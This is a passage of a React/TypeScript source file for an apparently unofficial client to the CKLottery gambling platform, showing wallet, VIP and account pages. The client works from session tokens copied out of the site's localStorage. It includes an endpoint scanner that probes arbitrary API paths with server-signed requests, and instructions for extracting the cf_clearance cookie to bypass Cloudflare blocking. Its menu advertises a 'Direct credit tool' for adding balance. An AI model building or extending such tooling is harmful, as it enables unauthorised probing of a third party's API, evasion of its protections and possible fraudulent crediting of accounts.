import { useState, useEffect, useCallback, useRef } from "react";
import type { UserSession } from "../App";
import { decodeJwt } from "../utils/jwt";
import { CK_API_BASE } from "../utils/ckSign";

interface ProfilePageProps {
  session: UserSession;
  initialUserInfo: Record<string, unknown> | null;
  onLogout: () => void;
  onUpdateSession: (updates: Partial<UserSession>) => void;
}

type Page = "home" | "main" | "vip" | "wallet" | "deposit" | "depositNew" | "withdraw" | "game" | "transaction" | "addBalance";

function buildAuth(s: UserSession) {
  return `${(s.tokenHeader || "Bearer").trim()} ${s.token}`.trim();
}

function parseApiJson(text: string, httpStatus: number): Record<string, unknown> {
  let json: Record<string, unknown>;
  try {
    json = JSON.parse(text) as Record<string, unknown>;
  } catch {
    throw new Error(`Non-JSON response (HTTP ${httpStatus}) — server may be blocked`);
  }
  if (json.error === "cloudflare_blocked") {
    throw new Error("cloudflare_blocked");
  }
  if (typeof json.error === "string" && json.code === undefined) {
    throw new Error(json.error as string);
  }
  if (json.code !== 0 && json.code !== 200 && json.code !== undefined) {
    throw new Error(String(json.msg || json.message || `API error code ${json.code}`));
  }
  return json;
}

// Try calling CKLottery API directly from the browser (works on mobile — no Cloudflare block)
// Uses the proxy's /sign endpoint to get a correctly signed body (avoids client-side MD5 bugs)
// Probe any arbitrary base URL + endpoint — used by the endpoint scanner
async function probeEndpoint(baseUrl: string, ep: string, session: UserSession): Promise<{ exists: boolean; msg: string }> {
  try {
    const signRes = await fetch("/api/proxy/sign", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ amount: 1 }),
    });
    if (!signRes.ok) return { exists: false, msg: "sign-svc-down" };
    const signed = await signRes.json() as Record<string, unknown>;
    const tokenHeader = (session.tokenHeader || "Bearer").trim();
    const res = await fetch(`${baseUrl.replace(/\/$/, "")}/${ep}`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        Authorization: `${tokenHeader} ${session.token}`.trim(),
        "token-header": tokenHeader,
      },
      body: JSON.stringify(signed),
    });
    const text = await res.text();
    let json: Record<string, unknown> = {};
    try { json = JSON.parse(text) as Record<string, unknown>; } catch { return { exists: false, msg: "non-json" }; }
    const msg = String(json.msg ?? json.message ?? json.error ?? JSON.stringify(json)).slice(0, 120);
    const m = msg.toLowerCase();
    const notExist = m.includes("url is not exist") || m.includes("url not exist") || m.includes("not exist") || m.includes("not found") || m.includes("no route") || m.includes("no such") || m.includes("invalid url");
    return { exists: !notExist, msg };
  } catch (e) {
    return { exists: false, msg: String(e).slice(0, 80) };
  }
}

async function apiPostDirect(path: string, body: Record<string, unknown>, session: UserSession): Promise<Record<string, unknown>> {
  // Step 1: get a server-signed body
  const signRes = await fetch("/api/proxy/sign", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!signRes.ok) throw new Error("Signing service unavailable");
  const signed = await signRes.json() as Record<string, unknown>;

  // Step 2: call CKLottery directly from the browser
  const tokenHeader = (session.tokenHeader || "Bearer").trim();
  const res = await fetch(`${CK_API_BASE}/${path}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json",
      Authorization: `${tokenHeader} ${session.token}`.trim(),
      "token-header": tokenHeader,
    },
    body: JSON.stringify(signed),
  });
  return parseApiJson(await res.text(), res.status);
}

// Try proxy (server-side) — may be blocked by Cloudflare on some IPs
async function apiPostProxy(path: string, body: Record<string, unknown>, session: UserSession): Promise<Record<string, unknown>> {
  const auth = buildAuth(session);
  const res = await fetch(`/api/proxy/ck/${path}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json",
      Authorization: auth,
      "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
      ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
    },
    body: JSON.stringify(body ?? {}),
  });
  return parseApiJson(await res.text(), res.status);
}

async function apiPost(path: string, body: unknown, session: UserSession): Promise<Record<string, unknown>> {
  const b = (body ?? {}) as Record<string, unknown>;
  // Try direct browser call first — mobile browsers are not blocked by Cloudflare
  try {
    return await apiPostDirect(path, b, session);
  } catch (directErr) {
    const msg = String(directErr);
    // CORS / network errors → fall back to proxy silently
    // Auth/API errors → re-throw immediately (proxy won't help)
    const isCorsOrNetwork = msg.includes("Failed to fetch") || msg.includes("NetworkError") || msg.includes("Load failed") || msg.includes("CORS") || msg.includes("fetch");
    if (!isCorsOrNetwork) throw directErr;
  }
  // Fallback: proxy
  return await apiPostProxy(path, b, session);
}

function extractList(d: Record<string, unknown>): Record<string, unknown>[] {
  // Try the top-level response or nested data
  const candidates = [d, d?.data, (d?.data as Record<string, unknown>)];
  for (const obj of candidates) {
    if (Array.isArray(obj)) return obj as Record<string, unknown>[];
    if (obj && typeof obj === "object") {
      const o = obj as Record<string, unknown>;
      // Cast wide net over all known CKLottery key names for payment type lists.
      // NOTE: "rechargetypelist" is all-lowercase per actual API response.
      for (const key of [
        "rechargetypelist", "rechargeTypelist", "rechargeTypeList",
        "typelist", "typeList", "payTypelist", "payTypeList",
        "rechargeTypes", "payTypes", "payTypeData",
        "list", "records", "items", "data", "result", "content",
      ]) {
        if (Array.isArray(o[key]) && (o[key] as unknown[]).length > 0) return o[key] as Record<string, unknown>[];
      }
    }
  }
  return [];
}

/** Collect all payment method arrays (e-wallet, bank, USDT, third-party) from a GetRechargeTypes response. */
function extractAllMethods(d: Record<string, unknown>): Record<string, unknown>[] {
  const data = (d?.data ?? d) as Record<string, unknown>;
  const out: Record<string, unknown>[] = [];
  const listKeys = ["rechargetypelist", "rechargeTypelist", "typelist", "typeList",
    "banklist", "bankList", "localUsdtlist", "localUsdtList", "thirdPayBankList", "thirdPayBanklist"];
  for (const key of listKeys) {
    const arr = data?.[key];
    if (Array.isArray(arr) && arr.length > 0) {
      for (const item of arr as Record<string, unknown>[]) {
        out.push({ ...item, _sourceKey: key });
      }
    }
  }
  return out;
}

// ─── Token expiry banner ───────────────────────────────────────────────────────
function ExpiredBanner({ onLogout }: { onLogout: () => void }) {
  return (
    <div className="mx-4 mt-3 bg-red-50 border border-red-200 rounded-2xl p-4">
      <div className="flex items-start gap-3">
        <span className="text-2xl">⚠️</span>
        <div className="flex-1">
          <div className="text-red-600 font-semibold text-sm">Token Expired</div>
          <div className="text-red-400 text-xs mt-1">
            Your session token has expired. Data cannot be loaded. Please log out and paste a fresh token.
          </div>
          <div className="text-red-400 text-xs mt-1">
            Get new token: open cklottery.club → console →{" "}
            <code className="bg-red-100 px-1 rounded text-[10px]">localStorage.getItem('token')</code>
          </div>
        </div>
      </div>
      <button
        onClick={onLogout}
        className="mt-3 w-full bg-red-500 text-white text-sm font-bold py-2 rounded-xl"
      >
        Logout & Refresh Token
      </button>
    </div>
  );
}

// ─── Shared sub-page shell ─────────────────────────────────────────────────────
function SubPage({ title, onBack, children }: { title: string; onBack: () => void; children: React.ReactNode }) {
  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <div className="bg-gradient-to-r from-blue-500 to-blue-600 px-4 pt-12 pb-5 flex items-center gap-3">
        <button onClick={onBack} className="text-white text-3xl leading-none w-8 flex-shrink-0">‹</button>
        <h1 className="text-white font-bold text-lg">{title}</h1>
      </div>
      <div className="flex-1 px-4 py-4 overflow-y-auto">{children}</div>
    </div>
  );
}

// ─── Status badge ──────────────────────────────────────────────────────────────
function StatusBadge({ status, str }: { status: unknown; str: unknown }) {
  const raw = String(str || status || "").toLowerCase().trim();
  const ok = raw === "success" || raw === "completed" || raw === "paid" || status === 1 || raw === "1";
  const pending = raw === "pending" || raw === "processing" || status === 0 || raw === "0";
  const fail = raw === "fail" || raw === "failed" || raw === "rejected" || status === 2 || raw === "2";
  const cls = ok ? "bg-green-100 text-green-600" : pending ? "bg-yellow-100 text-yellow-600" : fail ? "bg-red-100 text-red-500" : "bg-gray-100 text-gray-500";
  const label = str || (ok ? "Success" : pending ? "Pending" : fail ? "Failed" : status ?? "—");
  return <span className={`text-xs px-2 py-0.5 rounded-full font-medium ${cls}`}>{String(label)}</span>;
}

// ─── Cloudflare helpers ───────────────────────────────────────────────────────
function isCfError(err: string) {
  return err === "cloudflare_blocked" || err.toLowerCase().includes("cloudflare") || err.toLowerCase().includes("proxy blocked") || err.toLowerCase().includes("cf_clearance") || err.toLowerCase().includes("server may be blocked");
}

function CloudflareFixPanel({ onFix }: { onFix: (val: string) => void }) {
  const [val, setVal] = useState("");
  const [copied, setCopied] = useState(false);
  const consoleCmd = `document.cookie.match(/cf_clearance=([^;]+)/)?.[1]`;

  function copyCmd() {
    navigator.clipboard.writeText(consoleCmd).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); }).catch(() => {});
  }

  return (
    <div className="w-full mt-3 bg-amber-50 border border-amber-200 rounded-2xl p-4 text-left">
      <div className="flex items-start gap-2 mb-3">
        <span className="text-xl shrink-0">🛡️</span>
        <div>
          <div className="text-amber-800 font-semibold text-sm">Server blocked — paste cf_clearance to fix</div>
          <div className="text-amber-700 text-xs mt-0.5 leading-relaxed">
            The proxy server is blocked by Cloudflare. Paste your browser's Cloudflare cookie to bypass it.
          </div>
        </div>
      </div>
      <div className="bg-amber-100/60 rounded-xl p-3 mb-3 text-xs text-amber-900 leading-relaxed space-y-1">
        <div className="font-bold mb-1">Step-by-step:</div>
        <div>1. Open <strong>https://ckygjf6r.com</strong> in your browser (you'll see a security check)</div>
        <div>2. After the check passes, open browser console / DevTools</div>
        <div>3. Paste and run this command:</div>
        <div className="flex items-center gap-2 mt-1">
          <code className="bg-white border border-amber-200 rounded px-2 py-1 text-[11px] flex-1 break-all">{consoleCmd}</code>
          <button type="button" onClick={copyCmd} className="shrink-0 bg-amber-200 text-amber-800 text-xs px-2 py-1 rounded-lg font-medium active:opacity-70">
            {copied ? "✓" : "Copy"}
          </button>
        </div>
        <div className="mt-1">4. Copy the result (a long string) and paste below</div>
      </div>
      <input
        type="text"
        placeholder="Paste cf_clearance value here…"
        value={val}
        onChange={(e) => setVal(e.target.value)}
        className="w-full border border-amber-300 rounded-xl px-3 py-2.5 text-xs text-gray-800 bg-white focus:outline-none focus:border-amber-500 mb-2 font-mono"
      />
      <button
        type="button"
        disabled={!val.trim()}
        onClick={() => onFix(val.trim())}
        className="w-full bg-amber-500 text-white font-bold py-2.5 rounded-xl text-sm disabled:opacity-40 active:opacity-80"
      >
        Apply &amp; Retry
      </button>
    </div>
  );
}

// ─── Empty/Error state ────────────────────────────────────────────────────────
function ListState({ loading, error, empty, onCfFix, onRetry }: { loading: boolean; error: string; empty: boolean; onCfFix?: (val: string) => void; onRetry?: () => void }) {
  if (loading) return (
    <div className="flex flex-col items-center py-16 text-gray-400">
      <div className="text-4xl mb-3 animate-spin">⟳</div>
      <p className="text-sm">Loading...</p>
    </div>
  );
  if (error) {
    const isCf = isCfError(error);
    const isToken = error.toLowerCase().includes("expir") || error.toLowerCase().includes("token") || error.toLowerCase().includes("login");
    return (
      <div className="flex flex-col items-center py-8 text-center px-4 w-full">
        <div className="text-4xl mb-3">{isCf ? "🛡️" : isToken ? "⚠️" : "🔒"}</div>
        <p className="text-sm font-semibold text-orange-500 mb-1">
          {isCf ? "Cloudflare Blocked" : isToken ? "Token Expired" : "API Error"}
        </p>
        <p className="text-xs text-gray-400 mb-3">{error}</p>
        {onRetry && !isCf && (
          <button type="button" onClick={onRetry} className="text-xs bg-blue-50 text-blue-500 px-4 py-2 rounded-xl font-medium active:opacity-70">
            ↻ Retry
          </button>
        )}
        {isCf && onCfFix && <CloudflareFixPanel onFix={onCfFix} />}
      </div>
    );
  }
  if (empty) return (
    <div className="flex flex-col items-center py-16 text-gray-400">
      <div className="text-4xl mb-3">📭</div>
      <p className="text-sm">No records found</p>
    </div>
  );
  return null;
}

// ─── Game Home Page ────────────────────────────────────────────────────────────
const GAME_CATS = [
  { icon: "🏆", label: "Popular", color: "from-yellow-400 to-orange-400" },
  { icon: "🎱", label: "Lottery", color: "from-purple-500 to-blue-500" },
  { icon: "🎰", label: "Slots", color: "from-red-500 to-orange-400" },
  { icon: "⚽", label: "Sports", color: "from-green-400 to-teal-400" },
  { icon: "🃏", label: "Casino", color: "from-pink-500 to-rose-400" },
  { icon: "🀄", label: "Rummy", color: "from-orange-400 to-yellow-400" },
  { icon: "🦈", label: "Fishing", color: "from-blue-400 to-cyan-400" },
  { icon: "🎮", label: "Original", color: "from-violet-500 to-purple-400" },
];

const SLOT_PROVIDERS = [
  { label: "PP GAME", icon: "🎰" },
  { label: "CQ9 GAME", icon: "🎲" },
  { label: "JDB GAME", icon: "🃏" },
  { label: "MG GAME", icon: "🎡" },
  { label: "PG GAME", icon: "🎯" },
  { label: "JILI GAME", icon: "🎳" },
];

function GameHomePage({
  onNav,
  onLogout,
  wingoResults,
  wingoLoading,
}: {
  onNav: (p: Page) => void;
  onLogout: () => void;
  wingoResults: Record<string, unknown>[];
  wingoLoading: boolean;
}) {
  const [activeCat, setActiveCat] = useState("Popular");

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col pb-20">
      {/* Header */}
      <div className="bg-gradient-to-r from-blue-600 to-blue-500 px-4 pt-10 pb-4 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="text-white text-2xl">🏆</span>
          <span className="text-white font-bold text-lg tracking-wide">CKLOTTERY</span>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-white text-xl">✉️</span>
          <span className="text-white text-xl">⬇️</span>
        </div>
      </div>

      {/* Banner */}
      <div className="mx-4 mt-3 bg-gradient-to-r from-purple-600 via-blue-600 to-pink-500 rounded-2xl p-5 flex items-center justify-between shadow-lg">
        <div>
          <div className="text-yellow-300 text-xs font-bold mb-1">CKLOTTERY</div>
          <div className="text-white font-bold text-2xl leading-tight">1,500,000,000</div>
          <div className="text-white/80 text-xs mt-1">Join and win big prizes!</div>
        </div>
        <div className="text-6xl">🎰</div>
      </div>

      {/* Categories */}
      <div className="mx-4 mt-3 grid grid-cols-4 gap-2">
        {GAME_CATS.map((cat) => (
          <button
            key={cat.label}
            type="button"
            onClick={() => setActiveCat(cat.label)}
            className={`flex flex-col items-center gap-1.5 p-2 rounded-2xl transition-all ${
              activeCat === cat.label ? "ring-2 ring-blue-400 bg-blue-50" : "bg-white"
            } shadow-sm`}
          >
            <div className={`w-10 h-10 rounded-xl bg-gradient-to-br ${cat.color} flex items-center justify-center text-xl shadow`}>
              {cat.icon}
            </div>
            <span className="text-xs text-gray-600 font-medium">{cat.label}</span>
          </button>
        ))}
      </div>

      {/* WinGo Lottery Results */}
      {(activeCat === "Lottery" || activeCat === "Popular") && (
        <div className="mx-4 mt-3">
          <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
            <div className="bg-gradient-to-r from-purple-500 to-blue-500 px-4 py-3 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <span className="text-white text-xl">🎱</span>
                <span className="text-white font-bold">WinGo Lottery</span>
              </div>
              <span className="text-white/70 text-xs">Recent Results</span>
            </div>
            {wingoLoading ? (
              <div className="py-6 text-center text-gray-400 text-sm">Loading results...</div>
            ) : wingoResults.length === 0 ? (
              <div className="py-6 text-center text-gray-400 text-sm">🔒 API data unavailable (token expired)</div>
            ) : (
              <div className="divide-y divide-gray-50">
                {wingoResults.slice(0, 8).map((r, i) => (
                  <div key={i} className="px-4 py-3 flex items-center gap-3">
                    <div className="text-xs text-gray-400 w-20 shrink-0">{String(r.period ?? r.issueNumber ?? `#${i + 1}`)}</div>
                    <div className="flex-1 flex items-center gap-1">
                      {String(r.number ?? r.result ?? "").split("").map((n, j) => (
                        <div key={j} className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold text-white ${Number(n) <= 4 ? "bg-green-400" : "bg-red-400"}`}>{n}</div>
                      ))}
                    </div>
                    <div className={`text-xs font-semibold px-2 py-0.5 rounded-full ${r.color === "Green" || r.color === "green" ? "bg-green-100 text-green-600" : r.color === "Red" || r.color === "red" ? "bg-red-100 text-red-600" : "bg-purple-100 text-purple-600"}`}>
                      {String(r.color ?? r.winColor ?? "—")}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Slots */}
      {(activeCat === "Slots" || activeCat === "Popular") && (
        <div className="mx-4 mt-3">
          <div className="flex items-center gap-2 mb-2">
            <div className="w-1 h-5 bg-blue-500 rounded-full" />
            <span className="text-gray-800 font-bold">Slots</span>
          </div>
          <div className="grid grid-cols-3 gap-2">
            {SLOT_PROVIDERS.map((p) => (
              <div key={p.label} className="bg-white rounded-2xl shadow-sm p-3 flex flex-col items-center gap-2">
                <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-blue-400 to-purple-500 flex items-center justify-center text-2xl">
                  {p.icon}
                </div>
                <span className="text-xs text-gray-600 font-medium text-center">{p.label}</span>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Sports */}
      {activeCat === "Sports" && (
        <div className="mx-4 mt-3 bg-white rounded-2xl shadow-sm p-6 text-center text-gray-400">
          <div className="text-4xl mb-2">⚽</div>
          <div className="text-sm">Sports betting coming soon</div>
        </div>
      )}

      {/* Casino */}
      {activeCat === "Casino" && (
        <div className="mx-4 mt-3 bg-white rounded-2xl shadow-sm p-6 text-center text-gray-400">
          <div className="text-4xl mb-2">🃏</div>
          <div className="text-sm">Live casino games</div>
        </div>
      )}

      {/* Bottom nav */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-100 flex justify-around items-end py-2 z-20">
        <button type="button" onClick={() => {}} className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">🏠</span>
          <span className="text-[10px] text-blue-500 font-bold">Home</span>
        </button>
        <button type="button" className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">🎁</span>
          <span className="text-[10px] text-gray-500">Activity</span>
        </button>
        <div className="flex flex-col items-center gap-0.5">
          <div className="w-14 h-14 -mt-5 rounded-full bg-gradient-to-t from-orange-500 to-orange-300 flex items-center justify-center text-2xl shadow-lg">🎰</div>
          <span className="text-[10px] text-orange-500 font-bold">Get K20,000</span>
        </div>
        <button type="button" className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">💰</span>
          <span className="text-[10px] text-gray-500">Promotion</span>
        </button>
        <button type="button" onClick={() => onNav("main")} className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">👤</span>
          <span className="text-[10px] text-gray-500">Account</span>
        </button>
      </div>
    </div>
  );
}

// ─── VIP Page ──────────────────────────────────────────────────────────────────
function VIPPage({ vipData, claims, userInfo, onBack }: { vipData: Record<string, unknown> | null; claims: Record<string, unknown> | null; userInfo: Record<string, unknown> | null; onBack: () => void }) {
  const nickName = String(claims?.NickName || userInfo?.nickName || "Account");
  const vipLevel = Number(userInfo?.vipLevel ?? vipData?.vipLevel ?? vipData?.level ?? 4);
  const exp = vipData?.exp ?? vipData?.experience ?? vipData?.totalExp ?? vipData?.totalRecharge;
  const payoutDays = String(vipData?.payoutDays ?? 0);
  const benefits = [
    { icon: "🎁", label: "Level up rewards", desc: "Each account can only receive 1 time", reward: String(vipData?.levelUpReward ?? "5,599"), claimed: "0" },
    { icon: "⭐", label: "Monthly reward", desc: "Each account can only receive 1 time per month", reward: String(vipData?.monthlyReward ?? "999"), claimed: "0" },
    { icon: "💰", label: "Deposit Reward", desc: "Get rewards every deposit", reward: String(vipData?.depositRewardRate ? `${vipData.depositRewardRate}%` : "1%") },
    { icon: "🔐", label: "Safe", desc: "Increase the extra income of the safe", reward: "0.015%" },
  ];
  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <div className="bg-gradient-to-r from-blue-500 to-blue-600 px-4 pt-12 pb-12 relative">
        <button onClick={onBack} className="absolute top-12 left-4 text-white text-3xl w-8 flex items-center">‹</button>
        <h1 className="text-white font-bold text-xl text-center mb-8">VIP</h1>
        <div className="flex flex-col items-center">
          <div className="relative">
            <div className="w-20 h-20 rounded-full bg-gray-800 flex items-center justify-center text-4xl shadow-lg">🧑‍🦯</div>
            <div className="absolute -bottom-2 left-1/2 -translate-x-1/2 bg-gradient-to-r from-yellow-400 to-orange-400 text-white text-[10px] font-bold px-2 py-0.5 rounded-full shadow whitespace-nowrap">⭐ VIP{vipLevel}</div>
          </div>
          <div className="text-white font-bold text-lg mt-5">{nickName}</div>
        </div>
      </div>
      <div className="mx-4 -mt-3 bg-white rounded-2xl shadow overflow-hidden">
        <div className="grid grid-cols-2 divide-x divide-gray-100">
          <div className="px-4 py-4 border-b-2 border-blue-500 text-center">
            <div className="text-blue-500 font-bold text-xl">{exp !== undefined && exp !== null ? String(exp) : "—"} EXP</div>
            <div className="text-gray-400 text-xs mt-0.5">My experience</div>
          </div>
          <div className="px-4 py-4 text-center">
            <div className="text-gray-700 font-bold text-xl">{payoutDays} Days</div>
            <div className="text-gray-400 text-xs mt-0.5">Payout time</div>
          </div>
        </div>
      </div>
      <p className="text-xs text-gray-400 text-center mt-3 px-6">VIP level rewards are settled at 2:00 am on the 1st of every month</p>
      <div className="mx-4 mt-3">
        <div className="bg-gradient-to-r from-orange-400 to-rose-400 rounded-2xl p-5 relative overflow-hidden shadow">
          <div className="flex items-center gap-2 mb-1">
            <span className="bg-white/30 text-white text-xs px-2 py-0.5 rounded-full font-semibold">🏅 VIP{vipLevel}</span>
            <span className="text-green-200 text-xs font-semibold">✅ Achieved</span>
          </div>
          <div className="text-orange-100 text-xs mb-2">Dear VIP{vipLevel} customer</div>
          <div className="text-white font-bold text-base">Received VIP level up bonus{vipLevel}</div>
          <div className="absolute -right-4 -top-4 text-8xl opacity-20">⭐</div>
        </div>
      </div>
      <div className="mx-4 mt-4 mb-8">
        <div className="flex items-center gap-2 mb-3">
          <span className="text-blue-400 text-xl">💎</span>
          <span className="text-gray-800 font-bold">VIP{vipLevel} Benefits level</span>
        </div>
        <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
          {benefits.map((b, i) => (
            <div key={i} className="flex items-center gap-3 px-4 py-4 border-b border-gray-50 last:border-0">
              <div className="w-11 h-11 rounded-xl bg-blue-50 flex items-center justify-center text-xl shrink-0">{b.icon}</div>
              <div className="flex-1 min-w-0">
                <div className="text-sm font-semibold text-gray-800">{b.label}</div>
                <div className="text-xs text-gray-400 leading-tight">{b.desc}</div>
              </div>
              <div className="flex flex-col items-end gap-1 shrink-0">
                <div className="bg-orange-50 border border-orange-100 text-orange-500 text-xs font-bold px-2 py-0.5 rounded-full">🪙 {b.reward}</div>
                {b.claimed !== undefined && <div className="bg-blue-50 text-blue-400 text-xs px-2 py-0.5 rounded-full">💙 {b.claimed}</div>}
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ─── Helpers ───────────────────────────────────────────────────────────────────
function camel(k: string) {
  return k.replace(/([A-Z])/g, " $1").trim();
}

function isScalar(v: unknown): v is string | number | boolean {
  return typeof v === "string" || typeof v === "number" || typeof v === "boolean";
}

function pick(obj: Record<string, unknown>, keys: string[]): unknown {
  for (const k of keys) if (obj[k] !== undefined && obj[k] !== null && obj[k] !== "") return obj[k];
  return undefined;
}

// Generic flat-record card — shows every scalar field it finds
function RecordFields({ item, skip = [] }: { item: Record<string, unknown>; skip?: string[] }) {
  const entries = Object.entries(item).filter(
    ([k, v]) => !skip.includes(k) && isScalar(v) && v !== ""
  );
  if (entries.length === 0) return null;
  return (
    <div className="flex flex-wrap gap-x-4 gap-y-1 mt-1">
      {entries.map(([k, v]) => (
        <div key={k} className="text-xs text-gray-400 min-w-0">
          {camel(k)}: <span className="text-gray-600">{String(v)}</span>
        </div>
      ))}
    </div>
  );
}

// ─── Wallet Page ───────────────────────────────────────────────────────────────
function WalletPage({ wallets, loading, error, onBack }: { wallets: Record<string, unknown> | null; loading: boolean; error: string; onBack: () => void }) {
  return (
    <SubPage title="💳 Wallet" onBack={onBack}>
      <ListState loading={loading} error={error} empty={!loading && !error && !wallets} />
      {!loading && !error && wallets && (
        <div className="space-y-2">
          {/* Scalar top-level fields */}
          {Object.entries(wallets)
            .filter(([, v]) => isScalar(v) && v !== "" && v !== null && v !== undefined)
            .map(([k, v]) => (
              <div key={k} className="bg-white rounded-2xl shadow-sm p-4 flex justify-between items-center">
                <span className="text-sm text-gray-600 capitalize">{camel(k)}</span>
                <span className="text-sm font-bold text-gray-800">
                  {typeof v === "number" || (typeof v === "string" && !isNaN(Number(v)))
                    ? `K${v}`
                    : String(v)}
                </span>
              </div>
            ))}
          {/* Array fields — game wallets etc. */}
          {Object.entries(wallets)
            .filter(([, v]) => Array.isArray(v) && (v as unknown[]).length > 0)
            .map(([k, v]) => {
              const items = v as Record<string, unknown>[];
              return (
                <div key={k} className="bg-white rounded-2xl shadow-sm overflow-hidden">
                  <div className="px-4 py-2 bg-gray-50 border-b border-gray-100">
                    <span className="text-xs font-semibold text-gray-500 uppercase tracking-wide">{camel(k)}</span>
                  </div>
                  {items.map((item, i) => {
                    const name = String(pick(item, ["platName", "gameName", "name", "typeName"]) ?? `#${i + 1}`);
                    const bal = pick(item, ["balance", "gameBalance", "platBalance", "amount", "money"]);
                    return (
                      <div key={i} className="px-4 py-3 flex justify-between items-center border-b border-gray-50 last:border-0">
                        <span className="text-sm text-gray-600">{name}</span>
                        <span className="text-sm font-bold text-gray-800">
                          {bal !== undefined ? `K${bal}` : "—"}
                        </span>
                      </div>
                    );
                  })}
                </div>
              );
            })}
        </div>
      )}
    </SubPage>
  );
}

// ─── Main / Account Page ───────────────────────────────────────────────────────
function MainPage({ claims, userInfo, balance, tokenExpired, onNav, onLogout }: { claims: Record<string, unknown> | null; userInfo: Record<string, unknown> | null; balance: string; tokenExpired: boolean; onNav: (p: Page) => void; onLogout: () => void }) {
  const nickName = String(claims?.NickName || userInfo?.nickName || "Account").toUpperCase();
  const userId = String(claims?.UserId || userInfo?.userId || "—");
  const lastLogin = String(claims?.LoginTime || userInfo?.loginTime || "—");
  const vipLevel = userInfo?.vipLevel ?? claims?.vipLevel ?? 4;

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col pb-20">
      <div className="bg-gradient-to-r from-blue-500 to-blue-600 px-5 pt-12 pb-6">
        <div className="flex items-center gap-3">
          <div className="relative shrink-0">
            <div className="w-16 h-16 rounded-full bg-gray-800 flex items-center justify-center text-3xl shadow-lg">🧑‍🦯</div>
            <div className="absolute -bottom-1 left-1/2 -translate-x-1/2 bg-gradient-to-r from-yellow-400 to-orange-400 text-white text-[9px] font-bold px-1.5 py-0.5 rounded-full shadow whitespace-nowrap">⭐VIP{String(vipLevel)}</div>
          </div>
          <div className="flex-1 min-w-0">
            <div className="text-white font-bold truncate">{nickName}</div>
            <div className="mt-1"><span className="bg-orange-400 text-white text-xs px-2 py-0.5 rounded-full font-medium">UID ｜ {userId}</span></div>
            <div className="text-blue-100 text-xs mt-1">Last login: {lastLogin}</div>
          </div>
          <button onClick={onLogout} className="shrink-0 text-white/80 text-xs bg-white/15 border border-white/20 px-3 py-1.5 rounded-full">Logout</button>
        </div>
      </div>

      {tokenExpired && <ExpiredBanner onLogout={onLogout} />}

      <div className="mx-4 mt-3 bg-white rounded-2xl shadow-sm p-5">
        <div className="text-gray-400 text-sm mb-1">Total balance</div>
        <div className="text-gray-900 font-bold text-4xl flex items-center gap-2">K{balance}<span className="text-gray-300 text-xl">↻</span></div>
      </div>

      <div className="mx-4 mt-3 bg-white rounded-2xl shadow-sm p-5">
        <div className="grid grid-cols-4 gap-2">
          {([
            { icon: "💳", label: "Wallet", page: "wallet" },
            { icon: "📥", label: "Deposit", page: "deposit" },
            { icon: "📤", label: "Withdraw", page: "withdraw" },
            { icon: "💎", label: "VIP", page: "vip" },
          ] as const).map((a) => (
            <button key={a.page} type="button" onClick={() => onNav(a.page)} className="flex flex-col items-center gap-2 active:opacity-70">
              <div className="w-14 h-14 rounded-full bg-gray-50 border border-gray-100 flex items-center justify-center text-2xl shadow-sm">{a.icon}</div>
              <span className="text-xs text-gray-600">{a.label}</span>
            </button>
          ))}
        </div>
      </div>

      <div className="mx-4 mt-3 bg-white rounded-2xl shadow-sm p-4 flex items-center gap-3">
        <div className="w-12 h-12 rounded-2xl bg-yellow-50 flex items-center justify-center text-2xl shrink-0">🔒</div>
        <div className="flex-1">
          <div className="text-gray-800 font-semibold text-sm">Safe</div>
          <div className="text-gray-400 text-xs mt-0.5 leading-tight">Daily interest 0.5%, calculated every minute.</div>
        </div>
        <div className="text-orange-400 font-bold text-sm whitespace-nowrap shrink-0">K0.00 ›</div>
      </div>

      <div className="mx-4 mt-3 grid grid-cols-2 gap-3">
        {([
          { icon: "🎮", label: "Game History", sub: "My game history", page: "game" },
          { icon: "💸", label: "Transaction", sub: "My transaction history", page: "transaction" },
          { icon: "📥", label: "Deposit", sub: "My deposit history", page: "deposit" },
          { icon: "📤", label: "Withdraw", sub: "My withdraw history", page: "withdraw" },
          { icon: "➕", label: "Add Balance", sub: "Direct credit tool", page: "addBalance" },
        ] as const).map((h) => (
          <button key={h.page} type="button" onClick={() => onNav(h.page)} className="bg-white rounded-2xl shadow-sm p-4 flex items-center gap-3 text-left active:opacity-70">
            <div className="w-10 h-10 rounded-xl bg-blue-50 flex items-center justify-center text-xl shrink-0">{h.icon}</div>
            <div className="min-w-0">
              <div className="text-gray-800 text-sm font-semibold">{h.label}</div>
              <div className="text-gray-400 text-xs">{h.sub}</div>
            </div>
          </button>
        ))}
      </div>

      {/* Bottom nav */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-100 flex justify-around items-end py-2 z-20">
        <button type="button" onClick={() => onNav("home")} className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">🏠</span>
          <span className="text-[10px] text-gray-500">Home</span>
        </button>
        <button type="button" className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">🎁</span>
          <span className="text-[10px] text-gray-500">Activity</span>
        </button>
